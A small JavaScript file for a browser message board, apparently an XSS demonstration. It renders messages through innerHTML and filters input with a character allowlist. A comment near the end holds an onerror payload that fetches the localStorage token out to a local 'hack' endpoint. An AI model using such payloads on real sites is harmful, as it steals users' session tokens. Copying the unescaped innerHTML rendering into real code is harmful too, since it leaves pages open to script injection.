const userMessages = [];

const userMessageForm = document.querySelector('form');
const userMessagesList = document.querySelector('ul');

window.localStorage.setItem('token','Xdoia98XJA92DJnxsa898nX')

function renderMessages() {
  let messageItems = '';

  for (const message of userMessages) {
    messageItems = `
      ${messageItems}
      <li class="message-item">
        <div class="message-image">
          <img src="${message.image}">
        </div>
        <p>${message.text}</p>
      </li>
    `;
  }

  userMessagesList.innerHTML = messageItems;
}

function sanitizeString(str){
  console.log('PRÉ SANITIZE: ', str)
  str = str.replace(/[^a-zA-Z0-9áéíóúñü /:.,_-]/g,"").trim();
  console.log('PÓS SANITIZE: ', str)
  return str
}

function formSubmitHandler(event) {
  event.preventDefault();
  const userMessageInput = event.target.querySelector('textarea');
  const messageImageInput = event.target.querySelector('input');
  const userMessage = sanitizeString(userMessageInput.value);
  const imageUrl = sanitizeString(messageImageInput.value);

  if (
    !userMessage ||
    !imageUrl ||
    userMessage.trim().length === 0 ||
    imageUrl.trim().length === 0
  ) {
    alert('Please insert a valid message and image.');
    return;
  }

  userMessages.push({
    text: userMessage,
    image: imageUrl,
  });

  userMessageInput.value = '';
  messageImageInput.value = '';

  renderMessages();
}

//https://www.petz.com.br/blog/wp-content/uploads/2019/05/cachorro-independente-1.jpg

// Hack" onerror="fetch(`http://localhost:8080/hack?token=${localStorage.getItem('token')}`, { method: 'GET', headers: { 'Content-Type': 'application/json', }, })"

userMessageForm.addEventListener('submit', formSubmitHandler);